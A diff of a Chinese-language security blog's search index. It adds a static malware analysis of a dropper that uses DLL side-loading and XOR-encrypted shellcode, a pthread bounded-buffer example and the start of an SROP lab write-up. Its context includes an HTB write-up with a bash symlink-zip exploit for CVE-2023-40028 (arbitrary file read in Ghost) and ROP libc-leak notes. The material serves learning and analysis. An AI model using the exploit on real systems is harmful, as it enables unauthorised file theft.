@@ -79,6 +79,140 @@
       </tags>
   </entry>
   <entry>
+    <title>Drop File Malware 靜態分析</title>
+    <url>/2025/01/10/Malware/</url>
+    <content><![CDATA[<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><ul>
+<li>File Hash : d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca</li>
+</ul>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><figcaption><span>Tools</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1. Strings</span><br><span class="line">2. PE-Bear</span><br><span class="line">3. DIE (Detect It Easy)</span><br><span class="line">4. ResourceHacker</span><br><span class="line">5. IDA</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Basic-info"><a href="#Basic-info" class="headerlink" title="Basic info"></a>Basic info</h3><h4 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h4><ul>
+<li>Grep .com<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SkL8Jmb81e.png"
+                      alt="image"
+                ></li>
+<li>Grep dll<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJUZecFHyg.png"
+                      alt="image"
+                ></li>
+</ul>
+<h4 id="DIE"><a href="#DIE" class="headerlink" title="DIE"></a>DIE</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SkZy39Z81l.png"
+                      alt="image"
+                ></p>
+<ul>
+<li>AMD64 PE</li>
+<li>Develop with Vistual C&#x2F;C++</li>
+<li>Without packing</li>
+</ul>
+<h4 id="Import"><a href="#Import" class="headerlink" title="Import"></a>Import</h4><p>Kernel32.dll<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/r147djZU1l.png"
+                      alt="image"
+                ></p>
+<p>這邊可以看到跟 grep dll 的結果不太一樣，可以推測這支程式內還藏了一些東西</p>
+<h3 id="Decompile"><a href="#Decompile" class="headerlink" title="Decompile"></a>Decompile</h3><ul>
+<li><p>Entry point -&gt; <code>Optional header :: Entry Point + image base</code><br>  jmp to Entry point<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkJ1eobI1l.png"
+                      alt="image"
+                ><br>Security and CRT init</p>
+</li>
+<li><p>回到Function <code>main</code><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/Hk6wfoZ81l.png"
+                      alt="image"
+                ><br>會看到call 了同一個 Function 暫時命名為 load_resource</p>
+</li>
+</ul>
+<h4 id="Load-resource"><a href="#Load-resource" class="headerlink" title="Load_resource ?"></a>Load_resource ?</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BkpvQsZ81x.png"
+                      alt="image"
+                ></p>
+<p>所以這邊不是 <code>load_resource</code> 是 <code>saveResourceToPath</code> 才對<br>可以知道他從 resourcee drop 兩個 file lpName分別是</p>
+<ul>
+<li>101</li>
+<li>102</li>
+</ul>
+<h4 id="Drop-file-execution"><a href="#Drop-file-execution" class="headerlink" title="Drop file execution"></a>Drop file execution</h4><p>使用 <code>winexec</code> 執行<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BykieYBLyx.png"
+                      alt="image"
+                ></p>
+<h2 id="What-about-Drop-File"><a href="#What-about-Drop-File" class="headerlink" title="What about Drop File"></a>What about Drop File</h2><ul>
+<li><p>原程式的 .rsrc<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJYz05bLkx.png"
+                      alt="image"
+                ></p>
+</li>
+<li><p>ResourceHacker Extract File<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJWw2FWLJx.png"
+                      alt="image"
+                ><br>這邊把 DLL and EXE 都存起來</p>
+</li>
+</ul>
+<p>check file hash 就可以知道 exe 是正常的，但 dll 可能是惡意的</p>
+<p><a class="link"   href="https://www.virustotal.com/gui/file/e6bad7f19d3e76268a09230a123bb47d6c7238b6e007cc45c6bc51bb993e8b46" >EXE<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link"   href="https://www.virustotal.com/gui/file/82a0e722f6746d6f1db58b365c0f15da135bff170d2000858d6e345712ea8732" >DLL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Export-and-Import"><a href="#Export-and-Import" class="headerlink" title="Export and Import"></a>Export and Import</h3><ul>
+<li>DLL Export<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rkg4BsmI1e.png"
+                      alt="image"
+                ></li>
+<li>EXE Import<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ryjSUjX8Je.png"
+                      alt="image"
+                ></li>
+</ul>
+<h4 id="McVsoCfgGetObject"><a href="#McVsoCfgGetObject" class="headerlink" title="McVsoCfgGetObject"></a>McVsoCfgGetObject</h4><ul>
+<li><code>unk_1800159F0</code> 做 XOR 解密<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HkDT89WIke.png"
+                      alt="image"
+                ></li>
+</ul>
+<p>下個部分就是 VirtualAlloc and memmove 解密後的 unk_1800159F0</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJWY-5W81e.png"
+                      alt="image"
+                ></p>
+<ul>
+<li>VirtualAlloc : 分配 VM</li>
+<li>memmove :  將 unk_1800159F0 指向的 block copy 到 VirtualAlloc 的 block</li>
+<li>一段 XOR 解密過的資料被載入 VM</li>
+</ul>
+<p><code>unk_1800159F0 -&gt; shellcode</code></p>
+<h3 id="Conculsion"><a href="#Conculsion" class="headerlink" title="Conculsion"></a>Conculsion</h3><ul>
+<li>.rsrc 段內植入 合法的 exe 及 惡意的DLL</li>
+<li>Drop File <code>DLL side-loading</code><br>  但我們還看不出來他到底做了什麼(因為shellcode 做 XOR)，可以用動態分析看</li>
+</ul>
+<h2 id="VT"><a href="#VT" class="headerlink" title="VT"></a>VT</h2><p><a class="link"   href="https://www.virustotal.com/gui/file/d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca" >VT Check<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>威脅情資 LLM 應用</title>
     <url>/2024/11/26/RAG/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上學期自主學習因應老師要求，以 ATT&amp;CK 框架為基礎製作可以在駭客攻防課程中使用的<strong>攻擊鏈</strong>助教，最後以應用技術效率對比結尾。<br>但我覺得應該做成情資分析，例如：輸入情報分析 Technique | KillChain | Mitigations 等 ，並轉換成結構化數據，以 LLM 做 Data pre-process，也可以有更多使用方向。</p>
@@ -658,7 +792,7 @@
                       alt="image"
                 ></a></p>
 <p><a class="link"   href="https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#x47;&#104;&#x6f;&#x73;&#116;&#x40;&#x35;&#46;&#x35;&#57;&#46;&#49;" >&#x47;&#104;&#x6f;&#x73;&#116;&#x40;&#x35;&#46;&#x35;&#57;&#46;&#49;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
+<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#71;&#104;&#111;&#115;&#x74;&#64;&#x35;&#x2e;&#x35;&#57;&#x2e;&#49;" >&#71;&#104;&#111;&#115;&#x74;&#64;&#x35;&#x2e;&#x35;&#57;&#x2e;&#49;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>genrate_exp</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">generate_exploit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">local</span> FILE_TO_READ=<span class="variable">$1</span></span><br><span class="line">  IMAGE_NAME=$(<span class="built_in">tr</span> -dc A-Za-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 13; <span class="built_in">echo</span>)</span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/</span><br><span class="line">  <span class="built_in">ln</span> -s <span class="variable">$FILE_TO_READ</span> <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/<span class="variable">$IMAGE_NAME</span>.png</span><br><span class="line">  zip -r -y <span class="variable">$PAYLOAD_ZIP_NAME</span> <span class="variable">$PAYLOAD_PATH</span>/ &amp;&gt;/dev/null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <ul>
@@ -690,7 +824,7 @@
 
 <hr>
 <blockquote>
-<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#x73;&#x74;&#100;&#111;&#x75;&#x74;&#x40;&#71;&#76;&#x49;&#66;&#x43;&#95;&#x32;&#46;&#x32;&#46;&#53;" >&#x73;&#x74;&#100;&#111;&#x75;&#x74;&#x40;&#71;&#76;&#x49;&#66;&#x43;&#95;&#x32;&#46;&#x32;&#46;&#53;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
+<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#115;&#x74;&#x64;&#x6f;&#x75;&#x74;&#64;&#71;&#76;&#x49;&#66;&#67;&#x5f;&#50;&#x2e;&#50;&#46;&#53;" >&#115;&#x74;&#x64;&#x6f;&#x75;&#x74;&#64;&#71;&#76;&#x49;&#66;&#67;&#x5f;&#50;&#x2e;&#50;&#46;&#53;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
 </blockquote>
 <p><img  
                      lazyload
@@ -876,6 +1010,37 @@
 ]]></content>
       <tags>
         <tag>zsh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OS Bounded Buffer</title>
+    <url>/2024/08/26/os-bbuff/</url>
+    <content><![CDATA[<h2 id="INTRO"><a href="#INTRO" class="headerlink" title="INTRO"></a>INTRO</h2><ol>
+<li><p>共享記憶體的解決方案 (Share memory Solution)<br> 使用一個共享的Buffer（bounded buffer），這個Buffer有固定大小，生產者將數據放入Buffer，消費者從中取出數據。為了保證生產者和消費者不會同時訪問Buffer，使用互斥鎖 (mutex) 和兩個條件變量 (condition variables)，一個用於通知Buffer未滿 (not full)，另一個用於通知Buffer非空 (not empty)。</p>
+</li>
+<li><p>生產者 (Producer)<br> 生產者的工作是將數據放入Buffer中，當Buffer滿時，它會等待消費者取走一些數據以騰出空間。</p>
+</li>
+<li><p>消費者 (Consumer)<br> 消費者的工作是從Buffer中取出數據，當Buffer為空時，它會等待生產者放入新的數據。</p>
+</li>
+<li><p>Main Funtion</p>
+<ol>
+<li>初始化 mutex</li>
+<li><code>prod_thread, cons_thread</code> 保存新建 Thread ID , 創建生產者跟消費者 Thread</li>
+<li>等待 Thread 完成</li>
+<li>釋放它們佔用的資源 (destory)</li>
+</ol>
+</li>
+<li><p>LIB Function (pthread.h)</p>
+<ol>
+<li>pThread_t: <code>typedef __darwin_pthread_t pthread_t;</code></li>
+<li><code>pthread_mutex_lock</code> , <code>pthread_mutex_unlock</code> , <code>pthread_cond_wait</code> , <code>pthread_cond_signal</code><br> <a class="link"   href="https://www.ibm.com/docs/zh-tw/aix/7.3?topic=p-pthread-mutex-lock-pthread-mutex-trylock-pthread-mutex-unlock-subroutine" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ol>
+</li>
+</ol>
+<h3 id="IMPL"><a href="#IMPL" class="headerlink" title="IMPL"></a>IMPL</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 5  <span class="comment">// 緩衝區大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];  <span class="comment">// share memory buffer</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;            <span class="comment">// data amount in buffer</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;               <span class="comment">// producer write position</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;              <span class="comment">// consumer read position</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;  <span class="comment">// mutex lock for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_full;  <span class="comment">// not full condition variable for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_empty; <span class="comment">// not empty condition variable for buffer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        item = rand() % <span class="number">100</span>; <span class="comment">//隨機生成item</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span>(count == BUFFER_SIZE)&#123;</span><br><span class="line">            <span class="comment">//如果緩衝區已滿，等待not_full條件</span></span><br><span class="line">            pthread_cond_wait(&amp;not_full, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// to buffer</span></span><br><span class="line">        buffer[in] = item;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer produced: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer not empty signal</span></span><br><span class="line">        pthread_cond_signal(&amp;not_empty);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// if buffer is empty, wait for not_empty condition</span></span><br><span class="line">            pthread_cond_wait(&amp;not_empty, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get data from buffer</span></span><br><span class="line">        item = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer consumed: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// notify producer buffer not full</span></span><br><span class="line">        pthread_cond_signal(&amp;not_full);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// simulate consumption time</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producer_thread, consumer_thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// intialize mutex and condition variables</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_full, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_empty, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create producer and consumer threads</span></span><br><span class="line">    pthread_create(&amp;producer_thread, <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;consumer_thread, <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for threads to finish</span></span><br><span class="line">    pthread_join(producer_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// destroy mutex and condition variables</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    pthread_cond_destroy(&amp;not_full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <tags>
+        <tag>OS</tag>
       </tags>
   </entry>
   <entry>
@@ -1283,37 +1448,6 @@ Pwnable.tw</p>
       </categories>
       <tags>
         <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OS Bounded Buffer</title>
-    <url>/2024/08/26/os-bbuff/</url>
-    <content><![CDATA[<h2 id="INTRO"><a href="#INTRO" class="headerlink" title="INTRO"></a>INTRO</h2><ol>
-<li><p>共享記憶體的解決方案 (Share memory Solution)<br> 使用一個共享的Buffer（bounded buffer），這個Buffer有固定大小，生產者將數據放入Buffer，消費者從中取出數據。為了保證生產者和消費者不會同時訪問Buffer，使用互斥鎖 (mutex) 和兩個條件變量 (condition variables)，一個用於通知Buffer未滿 (not full)，另一個用於通知Buffer非空 (not empty)。</p>
-</li>
-<li><p>生產者 (Producer)<br> 生產者的工作是將數據放入Buffer中，當Buffer滿時，它會等待消費者取走一些數據以騰出空間。</p>
-</li>
-<li><p>消費者 (Consumer)<br> 消費者的工作是從Buffer中取出數據，當Buffer為空時，它會等待生產者放入新的數據。</p>
-</li>
-<li><p>Main Funtion</p>
-<ol>
-<li>初始化 mutex</li>
-<li><code>prod_thread, cons_thread</code> 保存新建 Thread ID , 創建生產者跟消費者 Thread</li>
-<li>等待 Thread 完成</li>
-<li>釋放它們佔用的資源 (destory)</li>
-</ol>
-</li>
-<li><p>LIB Function (pthread.h)</p>
-<ol>
-<li>pThread_t: <code>typedef __darwin_pthread_t pthread_t;</code></li>
-<li><code>pthread_mutex_lock</code> , <code>pthread_mutex_unlock</code> , <code>pthread_cond_wait</code> , <code>pthread_cond_signal</code><br> <a class="link"   href="https://www.ibm.com/docs/zh-tw/aix/7.3?topic=p-pthread-mutex-lock-pthread-mutex-trylock-pthread-mutex-unlock-subroutine" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ol>
-</li>
-</ol>
-<h3 id="IMPL"><a href="#IMPL" class="headerlink" title="IMPL"></a>IMPL</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 5  <span class="comment">// 緩衝區大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];  <span class="comment">// share memory buffer</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;            <span class="comment">// data amount in buffer</span></span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>;               <span class="comment">// producer write position</span></span><br><span class="line"><span class="type">int</span> out = <span class="number">0</span>;              <span class="comment">// consumer read position</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;  <span class="comment">// mutex lock for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_full;  <span class="comment">// not full condition variable for buffer</span></span><br><span class="line"><span class="type">pthread_cond_t</span> not_empty; <span class="comment">// not empty condition variable for buffer</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">producer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        item = rand() % <span class="number">100</span>; <span class="comment">//隨機生成item</span></span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span>(count == BUFFER_SIZE)&#123;</span><br><span class="line">            <span class="comment">//如果緩衝區已滿，等待not_full條件</span></span><br><span class="line">            pthread_cond_wait(&amp;not_full, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// to buffer</span></span><br><span class="line">        buffer[in] = item;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer produced: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// buffer not empty signal</span></span><br><span class="line">        pthread_cond_signal(&amp;not_empty);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line">        sleep(<span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">consumer</span><span class="params">(<span class="type">void</span>* param)</span>&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">// lock</span></span><br><span class="line">        <span class="keyword">while</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// if buffer is empty, wait for not_empty condition</span></span><br><span class="line">            pthread_cond_wait(&amp;not_empty, &amp;mutex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// get data from buffer</span></span><br><span class="line">        item = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        count--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer consumed: %d\n&quot;</span>, item);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// notify producer buffer not full</span></span><br><span class="line">        pthread_cond_signal(&amp;not_full);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex); <span class="comment">// unlock</span></span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>); <span class="comment">// simulate consumption time</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producer_thread, consumer_thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// intialize mutex and condition variables</span></span><br><span class="line">    pthread_mutex_init(&amp;mutex, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_full, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;not_empty, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create producer and consumer threads</span></span><br><span class="line">    pthread_create(&amp;producer_thread, <span class="literal">NULL</span>, producer, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;consumer_thread, <span class="literal">NULL</span>, consumer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for threads to finish</span></span><br><span class="line">    pthread_join(producer_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(consumer_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// destroy mutex and condition variables</span></span><br><span class="line">    pthread_mutex_destroy(&amp;mutex);</span><br><span class="line">    pthread_cond_destroy(&amp;not_full);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <tags>
-        <tag>OS</tag>
       </tags>
   </entry>
   <entry>
@@ -2131,6 +2265,72 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
+    <title>LYS SROP lab WriteUp</title>
+    <url>/2024/08/20/srop-WriteUp/</url>
+    <content><![CDATA[<blockquote>
+<p>srop (signal return oriented program)</p>
+</blockquote>
+<h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>當接收到一個sinal信號</p>
+<ol>
+<li><p>kernel 會把上下文 ( 各種暫存器 ) 保留到 stack 上，叫做 Signal Frame</p>
+</li>
+<li><p>kernal 將進程的控制流轉移到用戶定義的信號處理程序（signal handler）。這個處理程序是<strong>用戶程式</strong>中指定的一段代碼，用來處理特定的信號。</p>
+</li>
+<li><p>信號處理程序執行用戶定義的操作，如打印消息、清理資源、或者修改某些全局狀態 and ret。</p>
+</li>
+<li><p>當信號處理程序結束後，控制流會跳轉到一個名為 <code>__restore_rt</code> 的函數。這個函數內部會執行一個特定的系統調用指令：</p>
+ <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, 0xf  ; 將系統調用號 0xf (sys_rt_sigreturn) 放入 RAX 寄存器</span><br><span class="line">syscall       ; 呼叫系統調用，進入內核模式</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>上面這個function會call <code>sys_rt_sigreturn</code> 從stack中提取出之前保存的 Signal Frame，並恢復上下文，包括所有暫存器的值。 process 將繼續從原來中斷的位置執行。</p>
+</li>
+</ol>
+<h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>rop 需要設定每一個rigister的值<br>這時候在 stack 上擺好 Signal Frame，然後呼叫 sys_rt_sigreturn syscall，利用srop就可以一次設定好全部的rigster</p>
+<p>優點：效率高，簡化rop chain<br>缺點：需要較大的stack空間</p>
+<h3 id="rt-sigreturn"><a href="#rt-sigreturn" class="headerlink" title="rt_sigreturn"></a><code>rt_sigreturn</code></h3><p>一樣用前面xor的手法把rax設定成 0xf， <code>mov rax, 0xf; syscall</code> ，他就會 call 到 <code>rt_sigreturn</code></p>
+<blockquote>
+<p>find 0xf in <a class="link"   href="https://x64.syscall.sh/" >syscall<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+<h2 id="LYS-lab-srop"><a href="#LYS-lab-srop" class="headerlink" title="LYS lab_srop"></a>LYS lab_srop</h2><p>基本原理：在Linux中，信號處理過程中使用了一個名為sigreturn的系統調用，它會從堆疊中恢復寄存器的狀態。當一個信號處理程序結束時，系統會自動調用 sigreturn 來恢復程式的執行狀態。</p>
